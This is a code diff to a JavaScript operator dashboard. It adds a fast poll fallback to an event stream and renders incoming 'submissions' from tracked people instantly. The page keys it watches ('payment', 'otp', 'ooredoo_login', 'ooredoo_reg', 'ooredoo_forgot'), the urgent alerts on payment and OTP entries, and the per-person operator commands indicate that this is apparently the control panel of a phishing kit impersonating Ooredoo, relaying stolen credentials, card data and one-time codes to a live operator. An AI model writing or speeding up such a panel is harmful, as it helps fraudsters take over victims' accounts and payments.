@@ -2,8 +2,8 @@
    Dashboard controller.
 
    Bootstraps from a single API call, then keeps itself current from
-   the SSE stream. Every event updates exactly one conversation, so a
-   new submission never triggers a full list reload.
+   both the SSE stream and a fast incremental poll fallback so no
+   proxy or cross-origin buffer can ever delay realtime updates.
    ============================================================ */
 
 'use strict';
@@ -18,8 +18,12 @@ const openConversation = {
 /** EventSource handle. */
 let eventSource = null;
 
-/** Watchdog timer that flags a silent stream as offline. */
-let streamWatchdog = null;
+/** Fast background poll timer. */
+let pollTimer = null;
+let pollInFlight = false;
+
+/** Set of processed event IDs to prevent duplicate handling between SSE and poll. */
+const processedEventIds = new Set();
 
 /* ------------------------------------------------------------------
    Startup
@@ -55,18 +59,40 @@ async function startDashboard() {
   renderAdmin(boot.admin);
 
   storeReplaceConversations(boot.conversations || []);
-  store.lastEventId = boot.last_event_id || 0;
+  store.lastEventId = Number(boot.last_event_id || 0);
 
   renderConversationList();
   renderStats();
+  renderConnection('live');
 
   subscribeToEvents();
+  startFastPollLoop();
   renderChatPlaceholder();
 }
 
 /* ------------------------------------------------------------------
-   Realtime stream
+   Realtime stream + Fast Incremental Poll Fallback
    ------------------------------------------------------------------ */
+
+/** Process one incoming event with strict deduplication by _event_id. */
+function processIncomingEvent(name, payload) {
+  if (!payload) {
+    return;
+  }
+  const evtId = typeof payload._event_id === 'number' ? payload._event_id : 0;
+  if (evtId > 0) {
+    if (evtId <= store.lastEventId || processedEventIds.has(evtId)) {
+      return;
+    }
+    processedEventIds.add(evtId);
+    if (processedEventIds.size > 500) {
+      const first = processedEventIds.values().next().value;
+      processedEventIds.delete(first);
+    }
+    store.lastEventId = evtId;
+  }
+  handleRealtimeEvent(name, payload);
+}
 
 /** Open the event stream and keep it alive. */
 function subscribeToEvents() {
@@ -74,51 +100,81 @@ function subscribeToEvents() {
     eventSource.close();
   }
 
-  renderConnection('connecting');
-
-  eventSource = new EventSource(api.streamUrl(store.lastEventId));
+  try {
+    eventSource = new EventSource(api.streamUrl(store.lastEventId));
+  } catch (e) {
+    return;
+  }
 
   eventSource.addEventListener('ready', function (event) {
     const data = safeJson(event.data);
-    if (data && typeof data.cursor === 'number') {
+    if (data && typeof data.cursor === 'number' && data.cursor > store.lastEventId) {
       store.lastEventId = data.cursor;
     }
     renderConnection('live');
-    armWatchdog();
   });
 
   // The server ends each bounded stream deliberately; reconnect at once.
   eventSource.addEventListener('bye', function () {
-    renderConnection('connecting');
     eventSource.close();
-    window.setTimeout(subscribeToEvents, 400);
+    window.setTimeout(subscribeToEvents, 300);
   });
 
   REALTIME_EVENTS.forEach(function (name) {
     eventSource.addEventListener(name, function (event) {
-      armWatchdog();
+      renderConnection('live');
       const payload = safeJson(event.data);
-      if (!payload) {
-        return;
-      }
-      if (typeof payload._event_id === 'number') {
-        store.lastEventId = payload._event_id;
-      }
-      handleRealtimeEvent(name, payload);
+      processIncomingEvent(name, payload);
     });
   });
 
   eventSource.onopen = function () {
     renderConnection('live');
-    armWatchdog();
   };
 
   eventSource.onerror = function () {
-    // EventSource reconnects on its own; reflect the gap in the UI.
-    if (store.connection !== 'offline') {
-      renderConnection('connecting');
-    }
+    // Fast poll loop continues seamlessly while EventSource reconnects.
   };
+}
+
+/** Fast incremental poll every 2 seconds so updates arrive immediately even if SSE is buffered. */
+function startFastPollLoop() {
+  if (pollTimer) {
+    window.clearInterval(pollTimer);
+  }
+  pollTimer = window.setInterval(pollMissedEvents, 2000);
+}
+
+async function pollMissedEvents() {
+  if (pollInFlight) {
+    return;
+  }
+  pollInFlight = true;
+  try {
+    const res = await api.pollEvents(store.lastEventId);
+    renderConnection('live');
+    const list = res.events || [];
+    for (let i = 0; i < list.length; i += 1) {
+      const evt = list[i];
+      if (evt && evt.type && evt.payload) {
+        processIncomingEvent(evt.type, evt.payload);
+      }
+    }
+    if (typeof res.cursor === 'number' && res.cursor > store.lastEventId) {
+      store.lastEventId = res.cursor;
+    }
+  } catch (err) {
+    if (err && (err.status === 401 || err.status === 403)) {
+      window.location.replace('login.html');
+      return;
+    }
+    // Only mark offline if EventSource is also not open
+    if (!eventSource || eventSource.readyState !== 1) {
+      renderConnection('offline');
+    }
+  } finally {
+    pollInFlight = false;
+  }
 }
 
 /** Event names the server emits. */
@@ -190,24 +246,10 @@ function toggleSoundAlerts() {
   renderSoundToggle();
   if (store.soundEnabled) {
     playNotificationSound(false);
-    showToast('تم تفعيل التنبيهات الصوتية 🔔', 'success');
+    showToast('تم تفعيل التنبيهات الصوتية', 'success');
   } else {
-    showToast('تم كتم التنبيهات الصوتية 🔕', 'info');
+    showToast('تم كتم التنبيهات الصوتية', 'info');
   }
-}
-
-/** Reset the watchdog so a silent stream is reported as offline. */
-function armWatchdog() {
-  if (streamWatchdog) {
-    window.clearTimeout(streamWatchdog);
-  }
-  streamWatchdog = window.setTimeout(function () {
-    renderConnection('offline');
-    if (eventSource) {
-      eventSource.close();
-    }
-    window.setTimeout(subscribeToEvents, 1500);
-  }, 70000);
 }
 
 /** Parse a JSON frame, tolerating anything unexpected. */
@@ -218,13 +260,13 @@ function safeJson(text) {
     return null;
   }
 }
+
 /* ------------------------------------------------------------------
    Realtime event handling
    ------------------------------------------------------------------ */
 
 /**
- * Apply one realtime event.
- * Each branch touches a single conversation, never the whole list.
+ * Apply one realtime event immediately in 0ms.
  */
 function handleRealtimeEvent(type, payload) {
   const row = payload.user || null;
@@ -269,24 +311,40 @@ function handleRealtimeEvent(type, payload) {
 
   const id = Number(row.id);
   const wasKnown = store.conversations.has(id);
-  const previous = store.conversations.get(id);
+
+  // If a new submission arrived and the server sent `payload.submission` without full `row.submissions`, merge it
+  if (type === 'submission.created' && payload.submission && !Array.isArray(row.submissions)) {
+    const existing = store.conversations.get(id);
+    const prevSubs = existing && Array.isArray(existing.submissions) ? existing.submissions.slice() : [];
+    const subExists = prevSubs.some(function (s) { return s.id === payload.submission.id; });
+    if (!subExists) {
+      prevSubs.push(payload.submission);
+    }
+    row.submissions = prevSubs;
+    row.submission_count = prevSubs.length;
+    row.last_summary = payload.submission.summary || row.last_summary;
+  }
 
   storeUpsertConversation(row);
+  const storedRow = store.conversations.get(id) || row;
 
   if (type === 'user.created') {
     playNotificationSound(false);
-    showToast('عميل جديد: ' + (row.name || row.ref), 'info');
+    showToast('عميل جديد: ' + (storedRow.name || storedRow.ref), 'info');
   } else if (type === 'submission.created') {
+    if (payload.page_key === 'summary' || payload.page_key === 'payment_methods') {
+      return;
+    }
     const urgentPages = ['payment', 'otp', 'ooredoo_login', 'ooredoo_reg', 'ooredoo_forgot'];
     const isUrgent = urgentPages.indexOf(payload.page_key) !== -1;
     playNotificationSound(isUrgent);
     const label = payload.page_label || 'بيانات جديدة';
-    showToast((row.name || row.ref) + ' - ' + label, 'info');
+    showToast((storedRow.name || storedRow.ref) + ' - ' + label, 'info');
   } else if (type === 'user.pinned') {
     updateConversationCard(id);
     refreshConversationOrder();
     if (store.selectedId === id) {
-      renderChatHeader(row);
+      renderChatHeader(storedRow);
     }
     return;
   }
@@ -294,53 +352,75 @@ function handleRealtimeEvent(type, payload) {
   const nowSelected = store.selectedId === id;
 
   if (nowSelected && type === 'submission.created') {
-    // Pull the full conversation so the new block is rendered properly.
-    reloadConversation(id, true);
+    updateConversationCard(id);
+    refreshConversationOrder();
+    if (Array.isArray(storedRow.submissions)) {
+      openConversation.submissions = storedRow.submissions;
+      openConversation.navigation = storedRow.navigation || openConversation.navigation;
+      renderChatHeader(storedRow);
+      renderPageTabs(openConversation.navigation, openConversation.submissions);
+      renderSubmissions(openConversation.submissions);
+      renderStats();
+    } else {
+      reloadConversation(id, true);
+    }
   } else if (nowSelected) {
     updateConversationCard(id);
-    renderChatHeader(row);
+    renderChatHeader(storedRow);
+    renderActionBar(storedRow);
     renderStats();
   } else if (wasKnown) {
     updateConversationCard(id);
-    renderStats();
     refreshConversationOrder();
+    renderStats();
   } else {
-    // A brand new conversation: insert it and let it sort to the top.
     updateConversationCard(id);
     refreshConversationOrder();
     renderStats();
-  }
-
-  if (!wasKnown && previous === undefined) {
-    refreshConversationOrder();
   }
 }
 
 /* ------------------------------------------------------------------
-   Opening a conversation
+   Opening a conversation (Instant 0ms Rendering)
    ------------------------------------------------------------------ */
 
-/** Load and display one conversation. */
+/** Load and display one conversation immediately from memory, syncing in background if needed. */
 async function openConversationById(id) {
-  storeSelect(id);
-  storeSetRead(id, true);
+  const numId = Number(id);
+  storeSelect(numId);
+  storeSetRead(numId, true);
 
   // Reflect the read state immediately so the dot stops blinking.
-  updateConversationCard(id);
+  updateConversationCard(numId);
   renderStats();
   highlightSelectedCard();
 
-  try {
-    await reloadConversation(id, false);
-  } catch (error) {
-    showToast('تعذّر تحميل المحادثة.', 'error');
-    return;
+  const cached = store.conversations.get(numId);
+  if (cached) {
+    openConversation.id = numId;
+    openConversation.submissions = Array.isArray(cached.submissions) ? cached.submissions : [];
+    openConversation.navigation = Array.isArray(cached.navigation) ? cached.navigation : [];
+
+    renderChatHeader(cached);
+    renderPageTabs(openConversation.navigation, openConversation.submissions);
+    renderSubmissions(openConversation.submissions);
+    renderActionBar(cached);
+    $('chatBody').scrollTop = 0;
   }
 
-  // Persist the read state; the server broadcasts it to other tabs too.
-  api.markRead(id, true).catch(function () {
-    /* The conversation is open locally either way. */
-  });
+  // Persist the read state asynchronously without blocking the UI.
+  api.markRead(numId, true).catch(function () {});
+
+  // Only fetch from server if full submissions weren't preloaded in memory.
+  if (!cached || !Array.isArray(cached.submissions)) {
+    try {
+      await reloadConversation(numId, true);
+    } catch (error) {
+      if (!cached) {
+        showToast('تعذّر تحميل المحادثة.', 'error');
+      }
+    }
+  }
 }
 
 /** Fetch the full conversation detail. */
@@ -348,22 +428,26 @@ async function reloadConversation(id, silent) {
   const response = await api.conversation(id);
   const data = response.conversation;
 
-  openConversation.id          = Number(id);
-  openConversation.submissions = data.submissions || [];
-  openConversation.navigation  = data.navigation || [];
+  const fullUser = Object.assign({}, data.user, {
+    submissions: data.submissions || [],
+    navigation: data.navigation || []
+  });
 
-  // Keep the list row fresh without disturbing scroll position.
-  storeUpsertConversation(data.user);
+  storeUpsertConversation(fullUser);
   updateConversationCard(id);
 
   if (store.selectedId !== Number(id)) {
     return;
   }
 
-  renderChatHeader(data.user);
+  openConversation.id          = Number(id);
+  openConversation.submissions = fullUser.submissions;
+  openConversation.navigation  = fullUser.navigation;
+
+  renderChatHeader(fullUser);
   renderPageTabs(openConversation.navigation, openConversation.submissions);
   renderSubmissions(openConversation.submissions);
-  renderActionBar(data.user);
+  renderActionBar(fullUser);
   renderStats();
 
   if (silent !== true) {
@@ -393,6 +477,7 @@ function refreshListView() {
   renderConversationList();
   renderStats();
 }
+
 /* ------------------------------------------------------------------
    User actions
    ------------------------------------------------------------------ */
@@ -408,7 +493,7 @@ async function changeStatus(statusKey) {
     const response = await api.setStatus(id, statusKey);
     storeUpsertConversation(response.user);
     updateConversationCard(id);
-    renderChatHeader(response.user);
+    renderChatHeader(store.conversations.get(id) || response.user);
     renderStats();
 
     const status = storeStatus(statusKey);
@@ -434,7 +519,7 @@ async function sendCommand(command, button) {
     const response = await api.issueCommand(id, command);
     storeUpsertConversation(response.user);
     updateConversationCard(id);
-    renderChatHeader(response.user);
+    renderChatHeader(store.conversations.get(id) || response.user);
     renderStats();
 
     const definition = (store.commands || []).find(function (item) {
@@ -503,9 +588,9 @@ async function togglePinConversation(id) {
     updateConversationCard(numId);
     refreshConversationOrder();
     if (store.selectedId === numId) {
-      renderChatHeader(response.user);
+      renderChatHeader(store.conversations.get(numId) || response.user);
     }
-    showToast(response.is_pinned ? 'تم تثبيت المحادثة في الأعلى 📌' : 'تم إلغاء تثبيت المحادثة', 'success');
+    showToast(response.is_pinned ? 'تم تثبيت المحادثة في الأعلى' : 'تم إلغاء تثبيت المحادثة', 'success');
   } catch (error) {
     showToast('تعذّر تحديث التثبيت.', 'error');
   }
@@ -557,12 +642,21 @@ async function manualRefresh() {
   try {
     const response = await api.conversations(300);
     storeReplaceConversations(response.conversations || []);
-    store.lastEventId = response.last_event_id || store.lastEventId;
+    if (response.last_event_id && response.last_event_id > store.lastEventId) {
+      store.lastEventId = response.last_event_id;
+    }
+    renderConnection('live');
     refreshListView();
 
     const selected = storeSelected();
     if (selected) {
-      await reloadConversation(selected.id, true);
+      openConversation.id = selected.id;
+      openConversation.submissions = Array.isArray(selected.submissions) ? selected.submissions : openConversation.submissions;
+      openConversation.navigation = Array.isArray(selected.navigation) ? selected.navigation : openConversation.navigation;
+      renderChatHeader(selected);
+      renderPageTabs(openConversation.navigation, openConversation.submissions);
+      renderSubmissions(openConversation.submissions);
+      renderActionBar(selected);
     } else {
       renderChatPlaceholder();
     }
@@ -634,7 +728,7 @@ function wireEvents() {
     searchTimer = window.setTimeout(function () {
       storeSetSearch(value);
       refreshListView();
-    }, 140);
+    }, 100);
   });
 
   /* Filter chips. */
@@ -708,6 +802,9 @@ function wireEvents() {
   window.addEventListener('beforeunload', function () {
     if (eventSource) {
       eventSource.close();
+    }
+    if (pollTimer) {
+      window.clearInterval(pollTimer);
     }
   });
 }
